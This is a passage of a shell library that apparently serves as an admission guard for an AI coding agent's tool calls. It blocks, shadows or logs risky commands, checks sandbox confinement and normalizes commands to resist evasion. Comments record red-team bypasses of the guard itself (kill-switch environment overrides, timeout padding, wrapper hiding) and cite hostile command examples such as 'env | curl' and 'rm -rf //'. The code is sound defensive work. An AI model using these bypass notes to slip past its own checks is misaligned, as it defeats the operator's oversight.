    _oc=off
    _om="${HARBOR_SCOPE_MANAGED_SETTINGS:-${HARBOR_MANAGED_SETTINGS:-}}"   # the old name is read until 2026-11-15 (harbor#1097)
    if [ -n "$_om" ]; then [ ! -f "${_om%/*}/harbor-confinement" ] || _oc=confined
    elif [ -f '/Library/Application Support/ClaudeCode/harbor-confinement' ] || [ -f /etc/claude-code/harbor-confinement ]; then _oc=confined
    fi
    if [ "$_oc" = confined ]; then
      case "${FLOOR_IN:-}" in *'"dangerouslyDisableSandbox":true'*|*'"dangerouslyDisableSandbox": true'*) _oc=unconfined ;; esac
    fi
  fi

  # THE ESCAPE CLASS, `x` (harbor#1441): the class of an unconfined call from its first verb, printed as a literal from HARBOR_ADMISSION_CLASSES. Only the bash guard's unconfined records carry one; read by admission-observe-report.sh --confinement.
  _ox=-
  if [ "$_oc" = unconfined ] && [ "$_og" = bash ]; then
    _xo=other; floor_obs_class "${FLOOR_OBS_SUBJECT:-}" 2>/dev/null || :; _ox="$_xo"
    case " $HARBOR_ADMISSION_CLASSES " in *" $_ox "*) ;; *) _ox=other ;; esac
  fi

  { printf '{"v":1,"ts":"%s","g":"%s","d":"%s","r":"%s","s":"%s","t":"%s","h":"%s","sk":"%s","c":"%s","x":"%s"}\n' \
      "$_ots" "$_og" "$_ov" "$_or" "$_osh" "$_ot" "$_odg" "$_osk" "$_oc" "$_ox" >> "$_osink"; } 2>/dev/null || :
  return 0
}

# floor_obs_digest <cfg-dir> [subject] - 16 hex of sha256(salt ":" subject[0:512]), or "-".
# The subject is $FLOOR_OBS_SUBJECT, set by each guard after it extracts its payload; NOT an argument to floor_block (payload text beside the stderr printf is one edit from a leak) and NOT $FLOOR_IN (session_id and cwd would make one command hash differently per session and kill recurrence counting).
# SALTED, not just truncated: an unsalted short sha256 of a low-entropy command is a confirmation oracle, and floor_block's stderr hands over the plaintext. A per-install secret is the only operating point that answers "same command again?" without answering "what was it?".
# The hasher is pinned to absolute paths like FLOOR_GREP: floor_sha resolves through PATH, and on the block path a PATH-set fake would receive the command text, so floor_sha is NOT reused. /usr/bin/shasum is last (Perl, an order of magnitude slower).
floor_obs_digest() { # <cfg-dir> [subject]
  # harbor#309: an explicit subject (the session key's) replaces the guard's, one hasher for both.
  _dsub="${2-${FLOOR_OBS_SUBJECT:-}}"
  [ -n "$_dsub" ] || { printf '%s' -; return 0; }
  _dsf="$1/.helm-obs-salt"
  { [ -f "$_dsf" ] && [ ! -L "$_dsf" ]; } || { printf '%s' -; return 0; }
  # `|| :` and NOT `|| _dsalt=""` — `read` returns 1 on a file with no trailing
  # newline while still assigning.
  _dsalt=""
  { IFS= read -r _dsalt < "$_dsf"; } 2>/dev/null || :
  case "$_dsalt" in ''|*[!0-9abcdef]*) printf '%s' -; return 0 ;; esac
  [ "${#_dsalt}" -eq 32 ] || { printf '%s' -; return 0; }
  # Two printfs into one pipe, never a "$SALT:$CMD" concatenation: materialising
  # a 60,000-char concatenation is the part that is not flat.
  _dh=""
  for _dc in /sbin/sha256sum /usr/bin/sha256sum /bin/sha256sum \
             /usr/local/bin/sha256sum /opt/homebrew/bin/sha256sum; do
    if [ -x "$_dc" ]; then
      { _dh="$({ printf '%s:' "$_dsalt"; printf '%.512s' "$_dsub"; } | "$_dc")"; } 2>/dev/null || _dh=""
      break
    fi
  done
  if [ -z "$_dh" ]; then
    for _dc in /usr/bin/shasum /bin/shasum; do
      if [ -x "$_dc" ]; then
        { _dh="$({ printf '%s:' "$_dsalt"; printf '%.512s' "$_dsub"; } | "$_dc" -a 256)"; } 2>/dev/null || _dh=""
        break
      fi
    done
  fi
  _dh="${_dh%% *}"                       # both spellings print "<hex>  -"
  case "$_dh" in *[!0-9abcdef]*|'') printf '%s' -; return 0 ;; esac
  [ "${#_dh}" -ge 16 ] || { printf '%s' -; return 0; }
  # First 16 chars by parameter expansion, not `cut` — a second PATH-resolved
  # binary on the block path.
  _dt="${_dh#????????????????}"
  printf '%s' "${_dh%"$_dt"}"
  return 0
}

# floor_decide <guard> <rule> [ask 0|1] [escalate 0|1] [fallback-mode] — the verdict the controls register gives a fired rule
# (harbor#1030): block | shadow | warn | ask | off in FLOOR_VERDICT and the stamp in FLOOR_STAMP (stderr unless _FD_DEFER=1), both made by bin/admission-decide.sh beside
# the guard (or $FLOOR_DECIDE). Returns 1 with nothing printed when that file is absent, and the caller decides as it did before
# rows. A guard that answers a person passes ask=1 (it never reads the shadow switch); the rest read it here, and a rule that
# keeps enforcing (floor_shadow_enforces) is never loosened. <rule> carries no shape suffix.
floor_decide() {
  _fdd="${FLOOR_DECIDE:-}"
  if [ -z "$_fdd" ]; then case "$0" in */*) _fdd="${0%/*}/admission-decide.sh" ;; *) _fdd=./admission-decide.sh ;; esac; fi
  FLOOR_STAMP=; FLOOR_VERDICT=
  [ -f "$_fdd" ] || return 1
  _fda="${3:-0}"; _fds=0; _fde=0
  if [ "$_fda" != 1 ]; then
    [ "${HARBOR_ADMISSION_SHADOW:-0}" = 1 ] && _fds=1
    ! floor_shadow_enforces "$1" "$2" || _fde=1
  fi
  # The stamp comes back as a field and is printed here, or by floor_block after its refusal, which the reader sees first.
  _fdl="$(sh "$_fdd" "$1" "$2" --shadow "$_fds" --enforcing "$_fde" --ask "$_fda" --escalate "${4:-0}" --defer-stamp 1 ${5:+--fallback "$5"})" || _fdl=''
  _fdt="$(printf '\t')"; _fdv=''; _fdx=''; _fdy=''; _fdz=''
  IFS="$_fdt" read -r _fdv _fdx _fdy _fdz <<FDEOF
$_fdl
FDEOF
  FLOOR_STAMP="$_fdz"
  case "$_fdv" in block|shadow|warn|ask|off) ;; *) case "${5:-block}:$_fda" in warn:1) _fdv=ask ;; *) _fdv=block ;; esac ;; esac
  [ -z "$FLOOR_STAMP" ] || [ "${_FD_DEFER:-0}" = 1 ] || printf '%s\n' "$FLOOR_STAMP" >&2
  FLOOR_VERDICT="$_fdv"
}

# floor_block <guard> <message> [rule.shape] - deny the tool call: reason to stderr (fed back to the model), one record, exit 2. The one blocking exit in the floor.
# The record is written AFTER both printfs, so a logger fault cannot swallow the reason; the rule id is shown so the operator can name a wrong rule.
# The printed remedy is the NARROWEST true one (harbor#482): a `!` command or a hand edit, not the blanket kill-switch. Lint F16 keeps the blanket hatch out of every guard but the two where it is the true remedy.
# SHADOW (harbor#482): under HARBOR_ADMISSION_SHADOW=1 a rule records `shadow` and RETURNS, so the guard keeps evaluating and a later enforcing rule (floor_shadow_enforces) still blocks. Returning 0 keeps `hit ... && floor_block ...` lists alive under set -e.
floor_block() {
  # COVERED (harbor#1300): the confinement denies this target, so the OS decides; recorded, and the guard keeps
  # evaluating exactly as under shadow, so a later rule that is not covered still blocks.
  if floor_confinement_covers "$1" "${3%.*}"; then
    printf 'HELM FLOOR [%s:%s]: COVERED — the confinement denies this target, so the sandbox decides\n' "$1" "${3%.*}" >&2
    floor_log_decision "$1" covered "${3:-}" || :
    FLOOR_SHADOWED=1
    return 0
  fi
  # ROWS DECIDE (harbor#1030): the mode of the fired rule is its controls.tsv row, answered by floor_decide for every guard that
  # blocks through here. The predicate stays in the guard. No decision function beside the guard decides as before: the same
  # table, with every row a block row.
  _FD_DEFER=1
  if floor_decide "$1" "${3%.*}"; then _fbv="$FLOOR_VERDICT"
  elif [ "${HARBOR_ADMISSION_SHADOW:-0}" = 1 ] && ! floor_shadow_enforces "$1" "${3%.*}"; then
    _fbv=shadow
  else _fbv=''
  fi
  _FD_DEFER=0
  if [ "$_fbv" = shadow ]; then
    printf 'HELM FLOOR [%s:%s]: SHADOW — would have blocked; recorded, not enforced\n' "$1" "${3%.*}" >&2
    [ -z "${FLOOR_STAMP:-}" ] || printf '%s\n' "$FLOOR_STAMP" >&2
    floor_log_decision "$1" shadow "${3:-}" || :
    FLOOR_SHADOWED=1
    return 0
  fi
  if [ "$_fbv" = warn ]; then
    printf 'HELM FLOOR [%s:%s]: WARN — %s\n' "$1" "${3%.*}" "$2" >&2
    [ -z "${FLOOR_STAMP:-}" ] || printf '%s\n' "$FLOOR_STAMP" >&2
    floor_log_decision "$1" advise "${3:-}" || :
    FLOOR_SHADOWED=1
    return 0
  fi
  if [ -n "${3:-}" ]; then
    printf 'HELM FLOOR [%s:%s]: BLOCKED — %s\n' "$1" "${3%.*}" "$2" >&2
  else
    printf 'HELM FLOOR [%s]: BLOCKED — %s\n' "$1" "$2" >&2
  fi
  # A file-tool refusal has no command to hand to `!`: its narrow remedy is the edit itself.
  case "${FLOOR_TOOL:-}" in
    Write|Edit|MultiEdit|NotebookEdit)
      printf '(if this refusal is wrong: the operator can make this one edit themselves, in their own editor or terminal, which is not a tool call, so no guard sees it; the rule id above is what to report)\n' >&2 ;;
    *)
      printf '(if this refusal is wrong: the operator can run this one command as "! <command>" at the prompt, which is not a tool call, so no guard sees it; the rule id above is what to report)\n' >&2 ;;
  esac
  [ -z "${FLOOR_STAMP:-}" ] || printf '%s\n' "$FLOOR_STAMP" >&2   # after the refusal and its footnote: the first line is the reason
  floor_log_decision "$1" block "${3:-}" || :
  exit 2
}

# Set only by floor_block in this process. Cleared at source time, so a value
# inherited from the environment cannot suppress this call's allow record.
FLOOR_SHADOWED=

# floor_shadow_enforces <guard> <rule> - 0 iff this rule keeps blocking in a shadow session: the set that would let a shadow session unguard or unrecord itself or a later one, or take an act reserved to a person.
#   selfedit; *surface*, *-cfg*, cd-bridge-* (surfaces and the config dir from a command); killswitch-*; startup-file-* (where a persisted switch would live); api-route-*; finding-label-* (a finding disposition is the operator's act, #855).
# Matched by the rule ids' naming; floor.ledger-test SH-11 derives every guard-bash rule naming a floor surface or the config dir and fails if one falls outside. Everything else is measured, not enforced. guard-cloud and guard-destroy decide through permissionDecision and do not read shadow (admission-baseline.md).
floor_shadow_enforces() { # <guard> <rule>
  case "$1" in selfedit) return 0 ;; esac
  case "$2" in
    *surface*|*-cfg|*-cfg-*|cd-bridge-*) return 0 ;;
    killswitch-*|startup-file-*|api-route-*|finding-label-*) return 0 ;;
  esac
  return 1
}

# floor_confinement_covers <guard> <rule> - 0 iff this block is skipped because the confinement already denies its target (harbor#1300, #555 P3): the rule is in the covered set, the call runs confined, the operator turned the skip on, and the config dir is outside everything the sandbox lets a command write. Any doubt is 1, and the rule blocks.
# The set mirrors contracts/confinement-coverage.tsv (held equal by tests/admission/baseline/confinement.test.sh): rules whose whole target is the config dir or a floor surface in it; never a rule whose target can sit in the write zone, a remote action, or a file tool.
# NOTHING HERE IS READ FROM THE ENVIRONMENT (a project's `env` block reaches every hook): the marker and managed file are pinned literals, the marker must be root-owned, and the skip is a line only the operator's sudo install writes (harbor.toml sits in the write zone). Block path only, so its forks never touch an allowed call.
_FLOOR_CONF_DIRS='/Library/Application Support/ClaudeCode:/etc/claude-code'
_FLOOR_CONF_UID=0
_FLOOR_CONF_TMP='/tmp:/private/tmp'   # the temp trees a sandboxed command may write
# _floor_conf_under <dir> <rows> -> 0 when <dir> sits under one of the newline-separated rows (`~` expanded, a glob
# cut at its first `*`, so a pattern reads as the widest tree it can match). A pipe and `exit`, not a substitution:
# bash 3.2 as sh misparses case patterns inside $(...).
_floor_conf_under() {
  # Seatbelt enforces resolved paths, so a link on either side is compared resolved as well as spelled (review, #1300).
  _fut="${1%/}/"; _fur="$(cd -P -- "$1" 2>/dev/null && pwd -P)"; _fur="${_fur:+${_fur%/}/}"
  printf '%s\n' "$2" | { while IFS= read -r _ful; do
    [ -n "$_ful" ] || continue
    case "$_ful" in ('~') _ful="$HOME" ;; ('~/'*) _ful="$HOME/${_ful#'~/'}" ;; esac
    _ful="${_ful%%\**}"; _ful="${_ful%/}"
    _flr="$(cd -P -- "${_ful:-/}" 2>/dev/null && pwd -P)"; _ful="$_ful/"; _flr="${_flr:+${_flr%/}/}"
    for _fux in "$_fut" "$_fur"; do
      [ -n "$_fux" ] || continue
      case "$_fux" in ("$_ful"*) exit 0 ;; esac
      [ -z "$_flr" ] || case "$_fux" in ("$_flr"*) exit 0 ;; esac
    done
  done; exit 1; }
}
# _floor_conf_widened <dir>... -> 0 when a settings file Claude Code reads beside the managed one could widen the
# sandbox past what this check reads: a `sandbox` key (excludedCommands, filesystem.disabled, allowWrite),
# additionalDirectories, or an Edit/Write allow rule. An unreadable file counts as widened.
_floor_conf_widened() {
  for _fwd in "$@"; do
    [ -n "$_fwd" ] || continue
    for _fwf in "$_fwd/settings.json" "$_fwd/settings.local.json"; do
      [ -e "$_fwf" ] || continue
      "$FLOOR_JQ" -e 'has("sandbox") or ((.permissions.additionalDirectories // []) | length > 0)
          or ((.permissions.allow // []) | any(startswith("Edit(") or startswith("Write(")))' "$_fwf" >/dev/null 2>&1
      [ "$?" -eq 1 ] || return 0
    done
  done
  return 1
}
floor_confinement_covers() { # <guard> <rule>
  [ "$1" = bash ] && [ "${FLOOR_TOOL:-}" = Bash ] || return 1
  case "$2" in
    cd-cfg-then-fetch|cd-cfg-then-extract|cd-cfg-then-find-exec|cd-cfg-then-mutate|cd-cfg-then-plutil|cd-cfg-then-redirect) ;;
    cd-bridge-copy|cd-bridge-destroy|cd-bridge-move|destructive-at-cfg|rsync-delete-cfg) ;;
    extract-into-cfg|extractor-writes-cfg|mutate-into-cfg|plutil-writes-cfg|redirect-into-cfg) ;;
    mutate-onto-surface|mutate-aimed-surface|redirect-floor-surface|inplace-floor-surface|outdir-onto-surface) ;;
    outflag-onto-surface|jq-rewrites-surface|dasel-at-surface|dd-at-surface|tar-archive-at-surface|git-write-at-surface) ;;
    *) return 1 ;;
  esac
  case "${FLOOR_IN:-}" in *dangerouslyDisableSandbox*) return 1 ;; esac
  # A surface includes workflow files anywhere; one outside $PORT_ROOT (a clone in the sandbox's tmp) is writable.
  # Case-insensitive like the rules themselves, and APFS folds case (review, #1300).
  ! floor_ematch "${FLOOR_OBS_SUBJECT:-}" 'github.*workflows' || return 1
  _fcm=""; _fcs=""; _fci="$_FLOOR_CONF_DIRS:"
  while [ -n "$_fci" ]; do
    _fcd="${_fci%%:*}"; _fci="${_fci#*:}"
    if [ -f "$_fcd/harbor-confinement" ]; then _fcm="$_fcd/harbor-confinement"; _fcs="$_fcd/managed-settings.json"; break; fi
  done
  [ -n "$_fcm" ] && [ ! -L "$_fcm" ] && [ ! -L "$_fcs" ] || return 1
  [ "$(ls -ln "$_fcm" 2>/dev/null | awk '{ print $3 }')" = "$_FLOOR_CONF_UID" ] || return 1
  [ "$(ls -ln "$_fcs" 2>/dev/null | awk '{ print $3 }')" = "$_FLOOR_CONF_UID" ] || return 1
  "$FLOOR_GREP" -qx 'skip=covered' "$_fcm" 2>/dev/null || return 1
  # Where a confined command may write: the managed allowWrite rows, the project dir and the cwd (the sandbox's own
  # defaults), and the temp trees. The config dir, and the live one when they differ, must sit under none of them.
  _fcw="$("$FLOOR_JQ" -r 'if .sandbox.enabled == true and .sandbox.failIfUnavailable == true
      then (.sandbox.filesystem.allowWrite // [])[] else error("off") end' "$_fcs" 2>/dev/null)" || return 1
  _fcw="$_fcw
${CLAUDE_PROJECT_DIR:-}
$PWD
$(floor_field '.cwd')
${TMPDIR:-}
$(printf '%s\n' "$_FLOOR_CONF_TMP" | tr ':' '\n')"
  for _fct in "$(floor_config_dir)" "${LIVE_DIR:-$HOME/.claude}"; do
    ! _floor_conf_under "$_fct" "$_fcw" || return 1
  done
  # User, local and project settings apply to the sandbox too, and none is locked by the managed tier.
  _fcp="$(floor_field '.cwd')"
  ! _floor_conf_widened "$(floor_config_dir)" "${LIVE_DIR:-$HOME/.claude}" "${CLAUDE_PROJECT_DIR:+$CLAUDE_PROJECT_DIR/.claude}" \
      "$PWD/.claude" "${_fcp:+$_fcp/.claude}" || return 1
  return 0
}

# floor_ematch <text> <ERE> - 0 iff text matches the case-insensitive ERE. Portable BSD+GNU: no \b, \s or \d, and NO mid-pattern `^` inside an alternation (BSD grep silently never matches that alternative).
# The interpreter is PINNED to the system grep: an INHERITED FLOOR_GREP/FLOOR_AWK is an undocumented kill-switch (FLOOR_GREP=/usr/bin/false makes every rule false while the floor looks installed; red-team pass 8). The override is honoured only for a real system grep.
_fg="${FLOOR_GREP:-}"
# An allowlisted path is not an executable one: one absent on this host would make every rule read false (harbor#341), so `-x` is required.
case "$_fg" in
  /usr/bin/grep|/bin/grep|/usr/local/bin/grep|/opt/homebrew/bin/grep) [ -x "$_fg" ] || _fg="" ;;
  *) _fg="" ;;
esac
FLOOR_GREP="${_fg:-$( [ -x /usr/bin/grep ] && echo /usr/bin/grep || echo grep )}"
# FLOOR_JQ gets the same treatment: a bare `jq` was lost under a stripped PATH while /usr/bin/jq existed, every field read empty, and an unwrapped guard saw an empty command and allowed anything. Same allowlist, same reason (an inherited FLOOR_JQ=/usr/bin/false would be a kill-switch).
_fj="${FLOOR_JQ:-}"
case "$_fj" in
  /usr/bin/jq|/bin/jq|/usr/local/bin/jq|/opt/homebrew/bin/jq) [ -x "$_fj" ] || _fj="" ;;
  *) _fj="" ;;
esac
FLOOR_JQ="${_fj:-$( [ -x /usr/bin/jq ] && echo /usr/bin/jq || echo jq )}"
floor_ematch() { printf '%s' "$1" | "$FLOOR_GREP" -iEq -- "$2"; }

# Anti-evasion pre-pass for Bash guards (B3/B4). A naive grep over the raw command false-POSITIVES on inert single-quoted data and false-NEGATIVES on executed quoted args and command substitutions; floor_bash_targets normalizes one command into the newline-joined set of strings that will actually run, and callers grep each pattern over that set.

# floor_peel <cmd> — strip up to 3 layers of benign prefix wrappers
# (FOO=bar / sudo / env / nohup / command / exec / timeout N) so a wrapper
# can't hide the real first word (mirrors peelPrefixWrappers + the CC 2.1.145
# `FOO=bar cmd` auto-approve-bypass fix).
floor_peel() {
  _c="$1"; _i=0
  while [ "$_i" -lt 3 ]; do
    # A wrapper requires a COMMAND after it: `env | curl ...` is a dump piped somewhere, and stripping `env` there erased the evidence the CRED-05 rule needs (B7).
    _p="$(printf '%s' "$_c" | sed -E \
      -e 's/^[[:space:]]*[A-Za-z_][A-Za-z0-9_]*=[^[:space:]]+[[:space:]]+//' \
      -e 's/^[[:space:]]*(sudo|env|nohup|command|builtin|exec|stdbuf|nice|ionice)[[:space:]]+([^[:space:]|&;<>)])/\2/' \
      -e 's/^[[:space:]]*timeout[[:space:]]+[0-9]+[smhd]?[[:space:]]+//')"
    [ "$_p" = "$_c" ] && break
    _c="$_p"; _i=$((_i + 1))
  done
  printf '%s' "$_c"
}

# floor_is_executor <cmd> - 0 iff the command hands a (possibly quoted) string to an interpreter, so that string is CODE, not data.
# Deliberately PERMISSIVE: it gates whether the CODE variant is scanned at all, so a miss drops a live payload. The flag test accepts BUNDLED forms (bash -lc, python3 -Ec), a leading path (/bin/bash -c), and -c/-e/-r ANYWHERE after the interpreter word (zsh -o norc -c) (red-team 2026-07-24, pass 2).
# osascript is macOS's only; the Linux forms are listed (harbor#618).
floor_is_executor() {
  floor_ematch "$1" '(^|[^[:alnum:]_])(/[a-zA-Z0-9_./-]*/)?(bash|sh|zsh|dash|ksh|busybox)[[:space:]]+([^[:space:]]+[[:space:]]+)*--?[a-zA-Z-]*c([[:space:]]|=|$)' && return 0
  # trap runs its quoted action as eval runs its line, on the signal or at exit (harbor#1313).
  floor_ematch "$1" '(^|[^[:alnum:]_])(eval|trap|xargs|watch|timeout|nohup|setsid|flock|unshare|chroot|env)([[:space:]]|$)' && return 0
  floor_ematch "$1" '(^|[^[:alnum:]_])find([[:space:]]).*-exec' && return 0
  floor_ematch "$1" '(^|[^[:alnum:]_])(/[a-zA-Z0-9_./-]*/)?(python[0-9.]*|node|nodejs|ruby|perl|php|osascript)[[:space:]]+([^[:space:]]+[[:space:]]+)*--?[a-zA-Z-]*(c|e|r)([[:space:]]|=|$)' && return 0
  floor_ematch "$1" '(^|[^[:alnum:]_])(ssh|awk|make|systemd-run|docker|kubectl)([[:space:]])' && return 0
  # `sed` LEFT THIS LIST (edge pass 2026-08-29): its quoted argument is a SED program, where `|` is a delimiter, not a pipe; as CODE, `s|rm -rf /|X|` fired rm-rf-root.flat on ordinary edits.
  # No cover is lost: `sed 's/x/.../e'` and `sed -n 'w <surface>'` were allowed before and after (pre-existing gaps, in admission-baseline.md), and `sed -i '' 's/a/b/' <surface>` still blocks since the surface is its own operand.
  # sed reaches a shell only through GNU's `e`, so that keeps the promotion (a bound on what is handed over, not a claim the payload is caught). The `e` test errs toward promoting; the cost is a spurious extra variant.
  floor_ematch "$1" '(^|[^[:alnum:]_])sed([[:space:]])' \
    && floor_ematch "$1" '([^[:alnum:][:space:]]e|(^|[[:space:]])e)([[:space:]]|$)' \
    && return 0
  return 1
}

# floor_bash_targets <cmd> — the newline-joined set of strings that would
# ACTUALLY run. Delegates the shell-aware parse to admission-normalize.awk (see
# that file for the quoting model) and picks the variant by role:
#   • DATA  — quoted ARGUMENTS dropped (inert), word-adjacent quotes kept
#             (c'url' → curl, rm -rf ''/ → rm -rf /)
#   • CODE  — added only when the command is an interpreter, where the quoted
#             argument genuinely is code
#   • SUB   — every substitution body, always
# Executor detection runs on DATA, so a dangerous-looking string inside a
# commit message cannot promote the command to CODE.
# An inherited FLOOR_AWK/FLOOR_MAX_NORM is the same kill-switch class as FLOOR_GREP (privsec FO-03/04/05): only a real normalizer inside the guard directory is honoured.
_fa="${FLOOR_AWK:-}"
[ -n "$_fa" ] && [ ! -s "$_fa" ] && _fa=""
case "$_fa" in */admission-normalize.awk) ;; *) _fa="" ;; esac
# harbor#813: no dirname fork for a caller that set no DIR.
case "${0:-.}" in */*) _fad="${0%/*}" ;; *) _fad=. ;; esac
FLOOR_AWK="${_fa:-${DIR:-$_fad}/admission-normalize.awk}"

# floor_expand_vars <text> - substitute simple `NAME=value` assignments made earlier in the SAME command (`F=$HOME/.claude/settings.json; echo {} > $F`, red-team pass 3): rules need the dangerous token next to its verb. Bounded to 8; purely additive (scanned alongside the original).
floor_expand_vars() {
  _t="$1"
  case "$_t" in *=*) ;; *) printf '%s' "$_t"; return 0 ;; esac
  # Iterated with `set --`, not a pipe, so the substitutions accumulate in THIS shell.
  _old="$IFS"; IFS='
'
  # shellcheck disable=SC2086
  set -- $(printf '%s' "$_t" | "$FLOOR_GREP" -oE '[A-Za-z_][A-Za-z0-9_]*=[^[:space:];&|]+' 2>/dev/null | head -8)
  IFS="$_old"
  for _a in "$@"; do
    _n="${_a%%=*}"; _v="${_a#*=}"
    [ -n "$_n" ] || continue
    case "$_v" in *[\\\&\|]*) continue ;; esac   # keep sed's replacement safe
    _t="$(printf '%s' "$_t" | sed "s|\${$_n}|$_v|g; s|\$$_n|$_v|g" 2>/dev/null || printf '%s' "$_t")"
  done
  printf '%s' "$_t"
}

# floor_expand_paths <text> - rewrite every home spelling to the absolute home and collapse redundant slashes, so path rules match ONE canonical form instead of each regex re-listing spellings (`~user/`, `$HOME`; red-team pass 6).
# `/x/../` joins `//` through the shared collapse (harbor#94, P13-fs-02): this is the form CFG_RE, CFG_TOK, CFGDIR_RE, floor_seg_has args and archive destinations all read, so the fix lives here and not in each rule.
floor_expand_paths() {
  _fep="$(printf '%s' "$1" | floor_home_sed 2>/dev/null)" || { printf '%s' "$1"; return 0; }
  # A trailing '/.' or '/..' names a directory as surely as '/../' does: '~/..' is the
  # parent of $HOME (pass 13, P13D-1). Given its slash, the collapse below resolves it.
  case "$_fep" in */.*) _fep="$(printf '%s\n' "$_fep" | sed -e 's|/\.\.$|/../|' -e 's|/\.$|/./|')" ;; esac
  floor_collapse_dots "$_fep"
}

# Above this size the shell-aware normalizer is skipped: its char loop is O(n^2) in awk (200KB takes 11.7s), and a hook timeout is a SKIPPED hook, so padding was a fail-open bypass (QA plan R4). Oversized payloads fall back to the RAW command: cruder, O(n), fail-toward-BLOCKING.
case "${FLOOR_MAX_NORM:-}" in
  ''|*[!0-9]*) FLOOR_MAX_NORM=32768 ;;
  *) [ "$FLOOR_MAX_NORM" -lt 4096 ] && FLOOR_MAX_NORM=32768 ;;
esac

# floor_hd_strip_body <data-line> <raw-cmd> - echo the DATA line with the heredoc BODY removed, or unchanged when that cannot be done SAFELY (harbor#302).
# Why: a heredoc body is a document, but the flat scanners read it as the command (eleven ordinary blocks in one session).
# The opener line is everything before the first " ; " (admission-normalize.awk's line join); that is decidable here and not from FLOOR_SEGS, since `cat <<HD | sh` puts the shell between opener and body. Every guard returns the line UNCHANGED, so the failure mode is the status quo.
# harbor#784: a TYPED " ; " is the same three bytes, so the raw opener line is checked too (_floor_hd_line1_clean). <raw> is the command before normalizing.
_floor_hd_line1_clean() { # <raw> -> 0 iff line 1 is one whole heredoc opener line
  _hdr="${1%%
*}"
  # Bounded, so a long opener costs a scan rather than a hook timeout (fail-open).
  [ "${#_hdr}" -le 4096 ] || return 1
  case "$_hdr" in *'<<'*) ;; *) return 1 ;; esac
  # No typed separator, here-string, substitution, group or escape: each can put a
  # ` ; ` into DATA that is not this newline, or carry the command onto line 2.
  case "$_hdr" in *';'*|*'<<<'*|*'|'*|*'&'*|*'('*|*')'*|*'`'*|*\\*) return 1 ;; esac
  # A quote left open carries the command line past the newline. One linear awk
  # pass: a shell walk over 1000 quotes on a 4 KB line took 10 s of CPU.
  case "$_hdr" in *[\"\']*) ;; *) return 0 ;; esac
  printf '%s\n' "$_hdr" | awk '{
    q = ""; n = length($0)
    for (i = 1; i <= n; i++) { c = substr($0, i, 1); if (q == "") { if (c == "\047" || c == "\"") q = c } else if (c == q) q = "" }
    exit (q != "")
  }'
}
floor_hd_strip_body() {
  _hdl="$1"
  case "$_hdl" in *' ; '*) ;; *) printf '%s' "$_hdl"; return 0 ;; esac
  _hdo="${_hdl%% ; *}"
  case "$_hdo" in *'<<'*) ;; *) printf '%s' "$_hdl"; return 0 ;; esac
  # 1 · single simple command. `&&` and `||` are covered by `&` and `|`.
  case "$_hdo" in
    *'|'*|*'&'*|*';'*|*'$('*|*'`'*) printf '%s' "$_hdl"; return 0 ;;
  esac
  # 2 - THE CONSUMER IS ON AN ALLOW-LIST, NOT A DENY-LIST: a deny-list of interpreters is a claim about a set you do not control, and missed five consumers that execute a heredoc body (ssh, crontab, at, make, container exec).
  # Only consumers whose stdin cannot execute and whose purpose is writing a document to a file: cat and tee.
  _hdw="${_hdo%% *}"; _hdw="${_hdw##*/}"
  case "$_hdw" in
    cat|tee) ;;
    *) printf '%s' "$_hdl"; return 0 ;;
  esac
  # Deliberately NO "a redirect must be present" condition: it cost `tee /tmp/f <<EOF` (writes through its ARGUMENT) and bought nothing, since condition 1 already refuses every pipeline, compound and substitution form.
  # 3 · the opener names no floor surface. Substring, not CFG_RE — see the header.
  case "$_hdo" in
    *.claude*|*settings.json*|*hooks/*|*.git/*|*CLAUDE.md*) printf '%s' "$_hdl"; return 0 ;;
  esac
  # 3b · harbor#784: the first " ; " is the newline after the opener only when the
  # RAW first line is that whole opener. No raw command, no strip.
  _floor_hd_line1_clean "${2:-}" || { printf '%s' "$_hdl"; return 0; }
  # The delimiter, from `<<`, `<<-`, and with the quotes the normalizer already
  # stripped. Taken from the LAST `<<` on the opener so `a <<X` inside a quoted
  # argument cannot shadow the real one.
  _hdd="${_hdo##*<<}"; _hdd="${_hdd#-}"; _hdd="${_hdd%% *}"
  _hdd="$(printf '%s' "$_hdd" | tr -d "\"'")"
  [ -n "$_hdd" ] || { printf '%s' "$_hdl"; return 0; }
  # Walk the " ; "-joined fields: keep the opener, drop until the delimiter field,
  # keep the remainder. A line whose delimiter never appears is UNTERMINATED and is
  # returned unchanged — the conservative reading of a malformed command.
  _hdrest="${_hdl#* ; }"
  _hdkept=""
  _hdfound=0
  while [ -n "$_hdrest" ]; do
    case "$_hdrest" in
      *' ; '*) _hdf="${_hdrest%% ; *}"; _hdrest="${_hdrest#* ; }" ;;
      *)       _hdf="$_hdrest"; _hdrest="" ;;
    esac
    if [ "$_hdfound" = 1 ]; then
      _hdkept="$_hdkept ; $_hdf"
    elif [ "$_hdf" = "$_hdd" ]; then
      _hdfound=1
    fi
  done
  [ "$_hdfound" = 1 ] || { printf '%s' "$_hdl"; return 0; }
  # 4 - THE BODY MUST NAME NO FLOOR SURFACE. This keeps a pinned decision (floor-test: a heredoc into a FILE is live text to the flat rules, pinned as a pair with its find spelling, whose -exec child the ARGV layer still reads); without it the two spellings would drift.
  # Prose naming a destructive verb or rule token is unaffected. Documentation quoting a path inside the config dir still blocks; changing that changes the pinned posture, which is a decision.
  _hdbody="${_hdl#* ; }"
  case "$_hdbody" in
    *.claude*|*settings.json*|*/hooks/*|*CLAUDE.md*) printf '%s' "$_hdl"; return 0 ;;
  esac
  printf '%s%s' "$_hdo" "$_hdkept"
}

floor_bash_targets() {
  if [ "${#1}" -gt "$FLOOR_MAX_NORM" ]; then
    printf '%s\n' "$1"
    printf '%s\n' "$(floor_expand_paths "$1")"
    return 0
  fi
  [ -f "$FLOOR_AWK" ] || { printf '%s\n' "$1"; return 0; }   # fail-open-ish
  # harbor#805: a heredoc body is not quote-parsed, so neutralize its quotes before the
  # normalizer (which has no heredoc awareness) lets one leak past the terminator.
  _btin="$1"; case "$1" in *'<<'*) _btin="$(floor_hd_literalize_bodies "$1")" ;; esac
  _norm="$(printf '%s' "$_btin" | awk -f "$FLOOR_AWK" 2>/dev/null || true)"
  [ -n "$_norm" ] || { printf '%s\n' "$1"; return 0; }
  _data="$(floor_peel "$(printf '%s\n' "$_norm" | sed -n 's/^DATA://p')")"
  # harbor#302 — a heredoc BODY is a document, so the flat scanners must not read
  # it as the command. Returns the line UNCHANGED unless the opener is a single
  # simple command, its word is not an interpreter, and it names no floor surface.
  _data="$(floor_hd_strip_body "$_data" "$1")"
  printf '%s\n' "$_data"
  # Collapse repeated and dot slashes so rm -rf // reads as the root it resolves to (red-team pass 3).
  floor_collapse_dots "$_data"; printf '\n'
